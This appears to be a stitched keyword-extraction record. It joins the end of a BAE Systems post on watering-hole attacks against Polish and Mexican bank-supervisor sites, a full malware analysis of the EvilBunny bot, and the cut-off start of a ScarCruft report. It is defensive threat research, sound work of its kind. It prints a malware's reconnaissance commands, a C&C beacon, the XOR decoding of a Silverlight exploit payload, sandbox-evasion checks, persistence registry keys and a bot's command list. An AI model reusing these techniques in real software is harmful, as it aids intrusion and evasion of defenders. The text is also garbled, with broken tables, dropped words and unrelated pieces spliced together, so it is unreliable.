ACTIVITYThe compromised eye-watch[.]in domain has been associated with other malicious activity in recent months. Below is a list of samples which have used the site:MD5 hashFilenameFile InfoFirst seen4cc10ab3f4ee6769e520694a10f611d (73 KB)cb52c013f7af0219d45953bae663c9a 2svchost.ex (126 KB)2016-10- 07 03:09:43 12:10:33 14:29:58 11:50:15 18:20:34Origi nJPPLUYUSN/AThe last 4 samples can loosely be categorised as the same malware variant, however the first sample appears to be a separate exploit (as detailed later).It is worth noting that these samples were all compiled after the domain began being used alongside the knf.gov[.]pl watering-hole. Additionally, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed – suggesting this is all part of the same campaign.Despite this potential connection to the Poland bank compromises, the malware is not particularly advanced – for example using basic operations to gather system information. The malware attempts to run a series of commands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.These commands are as follows:cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query usercmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP""An example C&C beacon is seen below:GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 use eye-watch[.]in as a C&C channel but instead was downloaded from the URL:hxxps://www.eye-watch[.]in/design/fancybox/include/cambio.xap'cambio' is Spanish for 'change'. The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.]ch site.XAP is a software package format used for Microsoft Silverlight applications.It can be opened as a standard ZIP archive and contains the following files:AppManifest.xaml Shell_siver.dll System.Xml.Linq.dllTogether they form a re-packaged exploit for Silverlight based on CVE-2016-0034 (MS16-006) – a Silverlight Memory Corruption vulnerability. The exploit has previously been used by several exploit kits including RIG and Angler to deliver multiple crimeware tools.The Shell_siver.dll file contains a compile path:c:\Users\KKK\Desktop\Shell_siver\Shell_siver\obj\Release\Shell _siver.pdbInternally, the code of this DLL loads a 2nd stage library called binaryreader.Exploit – as seen below with the XOR-encoded string:byte[] array = new byte[] { 115,120,127,112,99,104,99,116,112,117, 116,99,63,84,105,97,125,126,120,101 for (int i = 0; i < array.Length; i++) { array[i] ^= 17; } if (args.get_InitParams().get_Keys().Contains(""shell32"")) type.InvokeMember(""run"", 256, null, obj, new object[]) }This 2nd stage payload DLL contained within the assembly is 30,720 bytes in size and encoded with XOR 56:Buffer.BlockCopy(Resource1._1, 54, array, 0, 30720); for (int i = 0; i < array.Length; i++) { byte b = 56; array[i] ^= b; }Once the payload stub is decoded, it represents itself as a PE-image, which is another .NET 4.0 assembly with the internal name binaryreader.dll.This second-stage DLL assembly, binaryreader.dll, is heavily obfuscated. The reported in a malware traffic analysis blog post from March 2016 where it was used to deliver Qbot. Thus it is likely the code comes from a criminal exploit kit which is being leveraged for delivery in this campaign.A similarly named cambio.swf (MD5 hash: address in December 2016.IP WHITELISTSWhen examining the code on the exploit kit website a list of 255 IP address strings was found. The IPs only contained the first 3 octets, and would have been used to filter traffic such that only IPs on that subnet would be delivered the exploit and payload.The IP addresses corresponded to a mix of public and private financial institutions spread across the globe:However, banks in some specific countries feature prominently in the list:Rank 3The prominence of Polish and Mexican banks matches the observation of watering- hole code on sites in both countries.CONCLUSIONSThe evidence available is currently incomplete and at the moment we can only conclude the following:• There has been a series of watering hole attacks on bank supervisor websites in Poland & Mexico, and a state owned bank in Uruguay in recent months. These leverage Silverlight and Flash exploits to deliver malware.• Investigators in Poland have identified known Lazarus group implants on bank networks and associated this with the recent compromise of the Polish Financial Supervision Authority's website.The technical/forensic evidence to link the Lazarus group actors (who we believe are behind the Bangladesh Bank attack and many others in 2016) to the watering-hole activity is unclear. However, the choice of bank supervisor / state-bank websites would be apt, given their previous targeting of Central Banks for Heists – even when it serves little operational benefit for infiltrating the wider banking sector.Nonetheless, further evidence to connect together the pieces of this attack is needed, as well as insights into the end-goal of the culprits. We are continuing our analysis of new artefacts as they emerge and may issue further updates in due course.RECOMMENDATIONSWe recommend organisations use the indicators provided in Appendix A to update their defensive systems to identify attacks. For compromised legitimate websites we would suggest a minimum 1 month block be placed on the domain. Patches against knf.gov[.]pl (currently clean) www.cnbv.gob[.]mx (currently clean) brou.com[.]uy (currently clean) sap.misapor[.]ch www.eye-watch[.]in Labels: Threat Research+2 Recommend this on GoogleNo comments:Post a CommentEnter your comment Comment as: Select profile Publish PublishPreview PreviewNEWER POSTOLDER POSTSUBSCRIBESign up to receive our regular Cyber Threat Bulletin.Sign upPOPULAR POSTSTWO BYTES TO $951MCYBER HEIST ATTRIBUTIONNEW MAC OS MALWARE EXPLOITS MACKEEPERCONTACTFor further information or to talk to an expert, please contact us.learn@baesystems.comContactAccessibilityTerms & conditionsPrivacySitemap© 2015 BAE Systems. All rightsreserved ","{'phrases': ['sites', 'compromise', 'visitors', 'Malware', 'Malicious JavaScript', 'Exploits', 'GET', 'silverlight', 'Flash', 'first', 'system info', 'second', 'commands', 'banks', 'specific countries'], 'target': 'sites; compromise; visitors; Malware; Malicious JavaScript; Exploits; GET; silverlight; Flash; first; system info; second; commands; banks; specific countries.'}"
PE; PDF; CVE-2011-4369; code; SMALL; t.; C2; OU; the dropper; OU; system info; the controller; a file; the XOR; commands; HTML; the C&C server; loads; the malware; persistence; the payload; NETMGr.exe; data; the C&C server; COMMAND; control; the attackers; attacks; 10; the campaign.,"[""1. The attacker sends a spear-phishing email with a malicious PDF exploiting CVE-2011-4369. 2. The exploit downloads and executes the EvilBunny dropper component. 3. The dropper performs anti-analysis checks to avoid detection. 4. The dropper drops the Suspect #4 malware binary and configures persistence. 5. Suspect #4 injects into svchost.exe for stealth. 6. It connects to hardcoded C2 servers and pulls encrypted configuration from resources. 7. Four threads are started to receive commands and Lua scripts from the C2s. 8. The main thread parses commands and executes Lua scripts in a loop. 9. Lua scripts call back to the malware code to enable new behaviors. 10. The malware logs activity locally and monitors its CPU usage to avoid detection. 11. Commands and scripts control the malware's actions on the infected host. 12. The full capabilities are unknown since the C2s are unavailable. ""]","Extract the keywords: page | 1EVIL BUNNY: SUSPECT #4SAMPLE DETAILSDropper Compile TimeSuspect #4 943.5 KB (966144 bytes) 773.5 KB (792064 bytes) 2011-10-25 19:28:39Marion Marschalek (marion@0x1338.at), 16th of October 2014BCC0 7607 2FFA BCA8 9048 D648 D169 73AF F372 F2CAThe EvilBunny attacks have been presented at Hack.lu Conference 2014 in Luxembourg(url Commons Attribution-NonCommercial-ShareAlike 4.0 International License.This work is licensed under apage | 2CONTENTS1. THE BUNNY DROPPER 4 2. SUSPECT #4 7 2.1 MALWARE ANTI-ANALYSIS 7 2.1.1 ENUMERATION OF FIREWALL AND ANTIVIRUS PRODUCTS 9 2.2 SYSTEM INFILTRATION 10 2.3 CONFIGURATION AND COMMAND & CONTROL SETTINGS 10 2.4 THE MULTI-THREADING MODEL 12 2.4.1 PERFORMANCE MONITORING 13 2.4.2 THE BACKFILE LAUNCHING THREAD 14 2.4.3 THE HEARER THREADS 14 2.5 C&C COMMAND PARSING 15 2.6 LUA ENGINE INTEGRATION 17 3. EVIL BUNNY IN THE SPOTLIGHT 20 4. ACKNOWLEDGEMENTS 22 5. RESOURCES 23 6. APPENDICES 24page | 31. THE BUNNY DROPPERSuspect #4 is the fourth out of a row of malware samples, which are believed to stem from the same malicious actor. Insights on the campaign were first presented at Hack.lu Conference 2014 in Luxembourg [8]. The name 'EvilBunny' is derived from a link to debug information embedded in the dropper binary of suspect #4. The path to the associated .pdb-file contains the name of the project and sub project, namely 'bunny 2.3.2' and 'Transporter2'.Illustration 1: IDA Pro's request for the associated .pdb-fileEvilBunny has been seen spreading through a malicious PDF document, exploiting CVE- 2011-4369 on 20th of December 2011 [1]. The exploit would download the bunny dropper and install suspect #4 on the infected system. Both, dropper and payload were compiled on 25th of October 2011, while CVE-2011-4369 was released only on 16th of December. It is unclear as of when the attacks started; although, clearly, either the attackers adopted the vulnerability within 4 days or the attacks were performed using an AdobeReader 0-day.The functionality of the dropper can be summarized in the following steps:• Sandbox check and anti virus product enumeration • Dropping payload 'netmgr.exe' • Creating a registry key for persistence • Creating a registry key for deletion of the dropperSearching for a sandbox environment, the malware takes a number of simple steps to verify. It tests the module file name to see if it is less than 5 characters long or if it contains either of the four strings 'klavme', 'myapp', 'TESTAPP' or 'afyjevmv.exe'. Also, it verifies if less than 15 processes are running in the environment, using the API call EnumProcesses.page | 4In case any of the conditions is met execution will abort. Up to the time of writing it remains unclear which environment the mentioned strings aim to identify, if any.Accessing the systems WMI (Windows Management Interface) the malware queries the installed AntiVirus software by issuing 'SELECT * FROM AntiVirusProduct'. More specifically, the malware is interested in the data fields and 'productState'. The information about AntiVirus provided by WMI differs between Windows versions, so the requests address different namespaces, 'ROOT\SecurityCenter' for WindowsXP and 'ROOT\SecurityCenter2' for Windows Vista and newer versions.Illustration 2: The process count as environment checkNames of AntiVirus products are represented as hard coded SHA-256 hashes, namely the and active on the machine execution will abort.The dropper comes with its payload attached in the resource section. The resource RCData contains the entire netmgr.exe binary; alleged suspect #4. The binary is dropped as netmgr.exe, either located in %APPDATA%\Perf Manager\ or %WINDIR%\msapps\. The final directory location depends whether the dropper is running with administrative privileges or not.Interestingly, the dropper also changes the creation time stamp of the newly created binary to time stamp of the system executable explorer.exe. This serves to avoid raising suspicion of a forensic analysts or tools.As a means of persistence the dropper creates an entry under [HKLM| HKCU]\ \CurrentVersion\Run which points to the dropped netmgr.exe binary. Thispage | 5ensures that netmgr.exe will be executed every time the system boots. Furthermore, the dropper generates another entry in the Windows registry, under [HKLM| HKCU]\Software\Microsoft\IPSec. This entry is named 'isakmpAutoNegociate' and points to the dropper binary. This key will be requested by netmgr.exe later to locate the dropper binary and delete it.The naming of the key for cleanup of the dropper is chosen to confuse analysts, although the name is clearly misspelled.Another interesting side fact is that the dropper does not start the dropped malware, neither does it contain code which could even do so. This implies, the final infection stage does not start unless the infected machine is rebooted. Also, the dropper binary will not be deleted in the meanwhile.page | 62. SUSPECT #4Suspect #4 was the fourth discovered sample in a row of malware related to the EvilBunny attacks; even before its dropper. Yet, it is by far the most interesting one. It is a multi- threaded bot with an integrated scripting engine. It incorporates a Lua engine and downloads and executes Lua scripts to reach a certain level of polymorphism. The Lua scripts can call back into the C++ code to alter the malware behavior at runtime.The malware seeks to keep a low profile on the infected machine, while executing the botmaster's commands and Lua scripts. In total Suspect #4 exhibits three different methods for receiving C&C input and executing commands; directly via HTTP, through a downloaded database file or as a scheduled task. Also, the malware will generate numerous files to help its execution and frequently reply back to the C&C with status messages.The initial purpose of the malware seems to be sharing execution load among infected host machines. However, due to the lack of the original Lua scripts and the extensive functionality of the embedded Lua engine the original intentions of the attackers remain unknown.2.1 MALWARE ANTI-ANALYSIS Suspect #4 is written in C++, and just like its dropper, it is not protected by any runtime packer or crypter. It is, however, compiled with a performance optimization option which causes a lot of code in-lining and duplicate code in the binary. Duplication also applies to string constants, as every string is present once per function, if the given function uses it. This might accelerate execution speed of the bot at runtime, but implicitly or even on purpose hinders static analysis of the binary code. Cross referencing of strings or helper functions is ineffective due to the duplications.Only few anti-analysis measures can be found in the binary. One function exists, which resembles the sandbox check of its dropper with minor extensions. This sandbox detection consists of three parts:• The module path name should be more than 5 characters long and contain either'msapps\' or 'Perf Manager\', which is the case if the sample was legitimately dropped by its dropper.• The module file name should not contain either of the following strings: 'klavme','myapp', 'TESTAPP' or 'afyjevmv.exe'.page | 7• The function performs a hook detection on time retrieval APIs. These areNtQuerySystemTime, GetSystemTimeAsFileTime and GetTickCount. Every API is called twice to calculate a delta, while performing a sleep(1000) operation between iteration one and iteration two. The final condition is, if any of the three deltas is below 998 milliseconds execution will abort. This can only be the case if any of the three API's return values is modified by a system monitoring solution, like a sandbox.Illustration 3: Hook detection on time retrieval functionsAnother evasion trick implemented by the malware is the partial obfuscation of API names. For no obvious reason though, the obfuscation algorithm is only applied to a small subset of APIs used in the code. The algorithm uses the fixed value AB34CD77h and a combination of XOR and ROL instructions to calculate hashes from the export names of kernel32.dll, advapi32.dll and psapi.dll. It is important to note that this obfuscation trick and the according hash function remain consistent through out all related samples.Illustration 4: The API name hashing functionpage | 82.1.1 ENUMERATION OF FIREWALL AND ANTIVIRUS PRODUCTSSimilar to its dropper, suspect #4 enumerates the system's installed AntiVirus product and checks firewall settings. For AntiVirus detection it utilizes WMI and issues 'SELECT * FROM AntiVirusProduct'. Identification of installed products is achieved by comparing the hashed product name to a set of SHA-256 hashes; although, a different and much bigger set than used by its dropper. With the help of hash tables from perturb.org and md5decoder.org it is possible to revert some of the hashes to their original text form: also 'productUptoDate'. It is noteworthy though, that for netmgr.exe the existence of any of the indicated AntiVirus products does not pose a reason to end execution. In fact, these hashes are the only measure for obfuscating strings in the binary.Firewall detection works equally via querying WMI through ""SELECT * FROM FirewallProduct"", while this time the malware searches for the attributes 'enabled', 'VersionNumber' and 'DisplayName'.AntiVirus and firewall information is stored in objects in a linked list at runtime. It will later either be exfiltrated to a C&C server directly or dumped to a local file on disk. Either way, the results of this check do not influence the flow of execution.page | 92.2 SYSTEM INFILTRATION After start-up the malware aims to inject itself to an svchost.exe process. For stealthiness the malware can either inject itself as a remote thread to a running svchost.exe process or perform the same procedure on a newly created one.As a singular means of persistence the malware relies on the auto-start registry key created by its dropper under [HKLM|HKCU]\ \CurrentVersion\Run, which will start netmgr.exe on every system boot.Also, the payload retrieves the dropper's path from 'isakmpAutoNegociate' under [HKLM| HKCU]\Software\Microsoft\IPSec, then deletes the binary and the 'isakmpAutoNegociate' registry key.2.3 CONFIGURATION AND COMMAND & CONTROL SETTINGS At start-up netmgr.exe decrypts a configuration file stored in its resource section, revealing three URLs, among timeout settings and encryption keys:• • •url url url three of these URLs served as C&C contacts when the attack was still ongoing, sending commands or Lua scripts to the infected host. Interesting is that two of the domains are actual fake domains resembling legitimate websites while one is a legitimate domain nowadays. Le-progres.net could be easily confused with leprogres.fr, the official website of the Lyon news paper Le Progres. Usthb-dz.org is remarkably similar to usthb.dz, the website of the University of Sciences and Technology Houari Boumediene in Algiers, Algeria.The third domain though, ghatreh.com, is the legitimate address of an Iranian news website. According to domaintools.com, this domain has been created in November 2004 while the last change happened in September 2012. Also, domaintools.com reveals 14 unique IP addresses and 4 different registrars. It is assumed that the domain has been dropped by the attackers in 2012 and picked up by legitimate operators.page | 10Illustration 5: The website of ghatreh.com todayThe IP addresses of the domains in 2011, at a time when dropper, payload and C&Cs located in Canada, two relate to Montréal, one to Oakville. The complete passive DNS purpose of it remains unclear. This IP address is never contacted by the malware.Find the entire decrypted configuration below: <COMMAND_FILE_PATH_AND_PREFIX>%SELFDIR%\net.cap</COMMAND_FILE_PATH_AND_PREFIX> <URL1>url <URL2>url <URL3>url <INJECTED>0</INJECTED> <STARTDELAY>0</STARTDELAY> <DIEDELAY>120</DIEDELAY>The configuration provides three keys for encryption and decryption of data. The command_key is used to decrypt commands received from the C&C server, the storage_key is used to encrypt and decrypt data being stored to files on disk and the response_key will encrypt callbacks to the C&C server. All data exchanged with any of the C&C servers as well as data stored to a file on disk is encrypted with the according key.Diedelay and startdelay are timeout settings, the exact use of the parameter injected ispage | 11unclear up to the time of writing. Command_file_path_and_prefix defines the name of the file which will holds C&C commands and Lua scripts at runtime. The malware performs C&C command parsing and Lua script execution with dedicated threads, of which every thread creates its own net.cap file, extending the name by a fixed digit namely 0, 1, 3 or 4.At runtime the malware adds additional configuration parameters, which are not assigned an obvious name like those retrieved from the resource section. The synonyms for all encrypted configuration values as they are stored in Windows registry are:– isakmpDataAfter the configuration is retrieved from the resource section the malware will create a subkey for every parameter under [HKLM|HKCU]\Software\Microsoft\IPSec. This key has initially been created by the dropper. The attributes are encrypted before being written to registry, and will be decrypted on the fly every time the malware requests a specific parameter.2.4 THE MULTI-THREADING MODEL Suspect #4 comes with a solid multi-threading model, which seeks to assure fail-safe and high-performance execution. The malware runs a main thread, which manages four worker threads and performs C&C command parsing and Lua script execution. The worker threads are dedicated to receive commands and scripts through different ways. Next to that, the main thread also runs sub threads to maintain log files the malware creates at during execution and to keep track of the overall system load the malware creates.The threads are coordinated via named events, global flag variables, in some cases alsopage | 12mutexes or semaphores are used. The main action of the malware is carried out in the main thread, which parses commands and executes Lua scripts, provided by the worker threads via command files.The threading model is summarized in the following graphic.Illustration 6: Summary of the thread model2.4.1 PERFORMANCE MONITORINGA dedicated thread is present for monitoring the CPU load the malware itself generates. Therefor the thread enumerates all threads from the current process and calculates their execution time.The user- and kernel land execution time is measured for every thread using the kernel32! GetThreadTimes API; then aggregated, so the final value holds the overall CPU usage time of the malware process. The thread keeps track of the time passing between executions. If the malware's active execution time in percentage of this delta exceeds a configured threshold, the malware will suspend all threads of its process for at least 5s. The threshold is retrieved from configuration in Windows registry, and can be controlled by the botmaster via the C&C command setcpulimit (see section 2.5).This clearly is an attempt to keeping a low profile on the infected machine. By maintaining its own execution load the bot's compromised svchost.exe process will not catch attention on the process list.page | 132.4.2 THE BACKFILE LAUNCHING THREADThe backfile launching thread got its name from the named event 'backfilelaunching' which is set to indicate that the dedicated thread has started. Also in a 1s-frequency the malware runs the backfile thread to push dump files to one of its remote servers.The files are named Perflib_Perfdat_dmpbX.dat, where X is an index number starting with 0. The data written to the file are status messages including a time stamp, which are returned by command and Lua script execution. The data is encrypted using the response_key from the configuration.2.4.3 THE HEARER THREADSThe term 'hearer' can be found plenty of times in the binary, it is assumed that it is equivalent to 'listener' of some sort. All together suspect #4 manages 4 hearer threads including one command file per thread. The command file is named net.capX, where X is the index of the thread; 0, 1, 3 or 4.The hearer thread's purpose is to receive instructions from the remote servers and provide them to the main thread. Such instructions are commands and/or one or more Lua scripts. Each hearer has a dedicated method to receive instructions which is either separately via HTTP from the server, aggregated through a downloaded data file or as tasks to be configured as scheduled tasks. The hearer threads dump the received instructions to their net.cap-files, from where the main thread's command parsing routine fetches and executes them. The data is encrypted with the storage_key before written to disk.HEARER 0Generic hearer thread. Started, but not involved in command fetching and parsing.HEARER 1Hearer 1 receives commands and Lua scripts directly via HTTP from one of the C&C servers. These are encrypted with the storage_key and stored to net.cap1 in the malware's working directory. Interestingly, the malware handles successful downloads with the HTTP status code 418. This code is not part of the original HTTP standard, but was introduced in RFC2324, 1998's traditional IETF April Fool's joke. The textual representation of status 418 is “I'm a teapot.”.HEARER 2Hearer 2 is responsible for managing the scheduled tasks, titled 'crontasks' by the malware. The tasks are stored in a file named perf.tmp, and when due for execution are copied to the according net.cap-file, net.cap2 in this case. From there the main thread canpage | 14fetch and execute them in its command parsing loop. Hearer 2 also creates a swap file named perf.tmp2, which helps in selectively editing the initial task file and in managing the task list.HEARER 3Hearer 3 searches for a file named netdump.db in its local working directory. If found, the thread will read its content in chunks representing different commands and paste these to net.cap3. Again, the data is encrypted with the storage_key. No functionality could be found in the malware code to write to netdump.db, which leaves the conclusion that this file will be downloaded from a C&C server.2.5 C&C COMMAND PARSING After initializing and starting all four hearer threads the main thread enters a command parsing loop. For every hearer the main thread invokes the command and script execution function. Therefor data is read from the encrypted net.capX- file, where X indicates the index of the hearer; 0, 1, 3 or 4. Once decrypted, this data is parsed to find valid C&C commands and / or valid Lua scripts to execute. More details on command and script execution can be found in section 2.6.Notable is that the command parsing and execution happens in a serial fashion, while Lua script execution is handed over to dedicated threads. Also, no direct relation between C&C commands and Lua script execution could be identified.The most notable actions of the bot can be summarized as follows:• Downloads and executes Lua scripts toinstrument its own code• Can install managed tasks (named 'crontask')for its integrated engine• Can maintain FTP connections • Can send and receive files via HTTP • Writes runtime information to local filesIllustration 7: Linear command executionpage | 15• Encryption for local data and network communicationHowever, suspect #4 does accept a list of hard coded commands to be sent by the C&C server. These mainly serve the purpose of controlling operation of the bot on the infected machine, such as restarting threads or setting configuration parameters. The full list of C&C commands can be found below:mainfrequency – Set a new timeout value for the command parsing loop.getconfig – Get configuration from registry and push it to C&C.ftpput – Push a file to an FTP server.ftpget – Download and store a file from an FTP server.sendfile – Send a local file to one of the C&Cs.getfile – Download and store a file from one of the C&Cs.uninstall – Set runtime flags to instruct main thread to terminate and delete related files.restarthearer – Restart one of the hearer threads, clean its runtime files.restart – Set runtime flag to instruct main thread to restart all threads.cleanhearer – Clear all files related to an indicated hearer thread.timeout – Configure a timeout value for HTTP connections.waitfor – Set a timeout value for hearer 1.updatedietime – Update the dietime value in registry.crontaska – Add new task to perf.tmp for hearer 2 to execute.crontaskr – Remove an entry in perf.tmp.crontaskl – List tasks from perf.tmp, write to perf.tmp2 and send to C&C.maxpostdata – Set a limit for data size to be sent to C&C via registry to limit data traffic.seturl – Add an additional C&C server URL to configuration in registry.stop – Set runtime flag to instruct main thread to shut down.setcpulimit – Configure a limit in percent for CPU usage, stored in registry.Every command execution function returns a status line, such as for example ""ftppage | 16command succeeded for: %s!\n"". The initial command, the status line and a current time stamp are encrypted and sent back to the C&C server. Additionally, the same data is written to the Perflib_Perfdat_dmpbX.dat file which is regularly pushed to the C&C by the backfile thread.For hearer 1 and 3 the command parsing routine will additionally manage two continuous log files which are named Perflib_Perfdata41X.dat and Perflib_Perfdata_42X.dat, where X is the respective hearer thread's index. More specifically, command parsing will increment a global variable holding the total amount of executed commands and scripts. This 4-byte value is appended to Perflib_Perfdata41X.dat before and Perlfib_Perfdata42X.dat after command execution. These files survive restart or cleanup, so every time the malware boots it reads the current status from these logs and continues from the latest value. This mechanism helps the botmaster to keep track of the bots activity on an infected host and could also be helpful in trouble shooting.2.6 LUA ENGINE INTEGRATION Suspect #4 incorporates an interpreter for Lua 5.1, LuaSocket 2.0.2 and C/Invoke Lua bindings. Lua is a lightweight programming language designed as a scripting language which can be embedded into applications, providing a C API for doing so. C bindings are provided through C/Invoke and enable Lua scripts to perform callbacks to C/C++ code. This constellation can be found in many video game engines to provide polymorphic behavior in games. Engine and game play features are injected through Lua scripts, which instrument the game engine code.The Lua interpreter is very small, compiled roughly 180kB, thus can easily be integrated in an application. The C/Invoke bindings enable Lua to be completely independent from the C/C++ application, so injected scripts can be pure Lua code.page | 17Illustration 8: A small portion of Lua callback functionsA script, if delivered to one of the hearer threads, will be provided through the corresponding net.cap-file of the hearer along with a C&C command. If a script is included in the data read from the net.cap-file, this is indicated by the start sentinel '<$'. Likewise, the end of a script is indicated by '$>'.Illustration 9: Command and script execution go hand in handCommand execution goes hand in hand with Lua script execution, thus is dependent of the four hearer threads. The work flow for each hearer per execution loop in the main thread is as follows:• Read and decrypt content from according net.cap-file • See if an entry of the C&C command list can be found in the decrypted datapage | 18If so, execute the command• • Hand the data over to the Luainterpreter thread• See if a Lua script can be located,••searching for start and end sentinel If so, start Lua thread and execute script If more than one script can be found start more Lua threads recursivelyIllustration 10: Command and script execution in detailAfter starting the Lua thread requests a value from Windows registry named 'EnableLua' under SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System. This key name stands for enable limited user account. When set to zero this key effectively disables UAC (User Account Control). The malware only requests the key value but does not change it. The value is later used by a callback function named 'popenWin' to decide on a way how a sub process should be started. Options are via WMIC using wmic.exe, Microsoft CScript engine using cscript.exe or directly via spawning a command line through cmd.exe.However, spawning sub processes is not the only feature which comes with Lua. The Lua interpreter is a powerful code base which enables suspect #4 to change functionality on the fly, as different scripts are downloaded and executed. The scripts define the functionality as they perform callbacks to the C/C++ code in the malware binary. The potential of the Lua interpreter can be investigated on the project homepage [4].Like command execution, Lua script execution also returns a status message which is extended by a time stamp and forwarded to one of the C&C servers, as well as written to the backfile log in Perflib_Perfdat_dmpbX.dat. Likewise, the Lua threads log their activity to Perflib_Perfdata_41X.dat/42X.dat.Due to the absence of C&C servers which hold the Lua scripts for the bot's Lua interpreter the true nature of this feature remains unclear.page | 193. EVIL BUNNY IN THE SPOTLIGHTThroughout analysis and due to the help of Paul Rascagniéres a number of binaries which relate to EvilBunny were identified [7]: obfuscation algorithm and respective key AB34CD77h.The indicators of a relation among all samples or a subset of samples are the following:• Same API name obfuscation algorithm and key • Equal infection routines / source code • Equal AntiVirus product enumeration technique • Shared C&C domain names and equal C&C commands • Equal proxy bypass technique / source codeMentioned set of malware also shows parallels in coding style and structure. However, it has to be pointed out that suspect #4 without doubt sticks out in terms of complexity and functionality. It is assumed that suspect #4 was created by the same authors, but this cannot be proved.Four of the set of identified samples are identical in functionality and capability. They possess respectable flooding capabilities and also provide remote access. However, they do not support data stealing or any spying functionality [8]. Two more C&C domains were identified for this group:url url the nature of the attack or the actor behind EvilBunny only vague conclusionspage | 20can be drawn. There has been public contemplation that the actor might be french and that the malware might be related to samples analyzed by the Canadian CSEC [9]. However, there hasn't been any hard evidence which links the attack to a group or a geographical location. Attribution is a tricky task and assumptions must not be drawn easily.page | 214. ACKNOWLEDGEMENTSFor providing technical insights, support and if I remember right even water, coffee or occationally rum, I want to express my deepest gratitude to Morgan Marquis-Boire, Sebastien Larinier, Paul Rascagniéres, Nicolas Brulez, Michael Shalyt and Inbar Raz.Further I want to thank Fred Arbogast, Alexandre Dulaunoy, Raphael Vinot and the remaining organizing team of Hack.lu for their advice and effort, even in situations of widespread insomnia.All of you – such wow, very awesome; rock on!page | 225. RESOURCES[1] An Analysis Of CVE-2011-4369 url b13e-825705b27730/how-to-disable-uac[4] The Lua Project url The C/Invoke Project url Lua scriptable game engines (Wikipedia) url All file hashes related to the EvilBunny malware url Hack.lu 2014 Keynote on TS/NOFORN url Quand les Canadiens partent en chasse de « Babar » url chasse-de-babar_4387233_3210.htmlpage | 236. APPENDICESAPPENDIX A – PASSIVE DNS RECORDSMarked in Grey is the data of sinkholes for the mentioned domains, currently operated by Kaspersky.Domain usthb-dz.orgLocation Network US US CA 14.12.2013 00:00 10.04.2011 00:00 10.03.2010 00:00 12.01.2009 00:00 19.09.2007 00:00 19.09.2007 00:00 30.12.2013 00:00 14.12.2013 00:00 20.09.2012 00:00 10.04.2011 00:00 10.03.2010 00:00 01.06.2009 00:00 20.04.2009 00:00 12.01.2009 00:00 19.09.2007 00:00Domain le-progres.netResolve 20.06.2014 00:00 02.11.2009 00:00 13.04.2009 00:00 16.03.2009 00:00 04.11.2007 00:00 01.11.2007 00:00Last 09.11.2014 09:24 27.07.2014 00:21 17.06.2014 07:16 02.11.2009 00:00 13.04.2009 00:00 16.03.2009 00:00 08.12.2008 00:00 02.11.2008 00:00 25.09.2008 00:00 06.12.2007 00:00 04.11.2007 00:00page | 24Domain ghatreh.comLocation Network CA CA CA US US US USFirst 07.09.2012 00:00 04.09.2012 00:00 14.03.2012 00:00 10.04.2011 00:00 23.03.2008 00:00 16.10.2006 00:00 07.10.2006 00:00 23.09.2006 00:00 29.04.2006 00:00 14.02.2005 00:00 12.02.2005 00:00 22.11.2004 00:00Last 09.11.2014 09:45 01.04.2013 00:00 04.09.2012 00:00 07.04.2012 00:00 14.03.2012 00:00 10.04.2011 00:00 23.03.2008 00:00 16.10.2006 00:00 07.10.2006 00:00 30.09.2006 00:00 23.09.2006 00:00 01.07.2006 00:00 29.04.2006 00:00 14.02.2005 00:00 12.02.2005 00:00Domain callientefever.infoResolve 25.10.2010 00:00 07.10.2014 06:26 25.10.2010 00:00Domain fullapple.netResolve 09.12.2010 00:00 02.12.2009 00:00Last 09.04.2014 10:48 09.12.2010 00:00 23.01.2010 00:00 13.12.2009 00:00page | 25APPENDIX B – LIST OF RUNTIME FILES SUSPECT #4net.capX (where X is the index of the hearer thread; 0, 1, 3 or 4)perf.tmpperf.tmp2netdump.dbPerflib_Perfdat_dmpbX.dat (where X is an incremental index)PerfLib_Perfdata_41X.dat (where X is the index of the hearer; 1 or 3)PerfLib_Perfdata_42X.dat (where X is the index of the hearer; 1 or 3)page | 26 ","{'phrases': ['The attacker', 'a malicious PDF', 'CVE-2011-4369', 'The exploit', 'Downloads', 'EvilBunny', 'the dropper', 'checks', 'detection', 'suspect', '#', 'binary', 'persistence', 'stealth', 'C2', 'encrypted configuration', 'resources', 'four', 'threads', 'start', 'commands', 'Lua scripts', 'the main thread', 'the malware code', '10', 'activity', 'CPU usage', 'CONTROL', 'the infected host', '12'], 'target': 'The attacker; a malicious PDF; CVE-2011-4369; The exploit; Downloads; EvilBunny; the dropper; checks; detection; suspect; #; binary; persistence; stealth; C2; encrypted configuration; resources; four; threads; start; commands; Lua scripts; the main thread; the malware code; 10; activity; CPU usage; CONTROL; the infected host; 12.'}"
ScarCruft; a business; North Korea; the document; PowerShell; a macro; trust access; the macro; second; Kaspersky; security software; the malware; persistence; PHP; the compromised web server; control; the attackers; log files; 10; the victim.,"['1. Actor sends spearphishing email with password-protected RAR archive containing malicious Word doc. 2. Word doc macro checks for antivirus and sets registry key to disable macro security in Word. 3. Macro decrypts and executes next stage VBA payload containing shellcode. 4. Shellcode fetches next stage payload from remote server. 5. Initial PowerShell payload achieves persistence and contacts C2 server. 6. C2 server sends commands to execute on victim system for exfiltration, screenshots, etc. 7. Actor uses credentials stolen from victim to spearphish associates. 8. Additional payloads like Windows executable and Android apps deployed for extended surveillance. 9. Malware exfiltrates documents, messages, contacts, and other sensitive data from victims. 10. Actor monitors infections via control panel and issues new commands. 11. Updated malware variants deployed over time to evade detection. ']","Extract the keywords: ScarCruft surveilling North Korean defectors and human rights activistssecurelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/AuthorsGReATThe ScarCruft group (also known as APT37 or Temp.Reaper) is a nation-state sponsored APT actor we first reported in 2016. ScarCruft is known to target North Korean defectors, journalists who cover North Korea-related news and government organizations related to the Korean Peninsula, between others. Recently, we were approached by a news organization with a request for technical assistance during their cybersecurity investigations. As a result, we had an opportunity to perform a 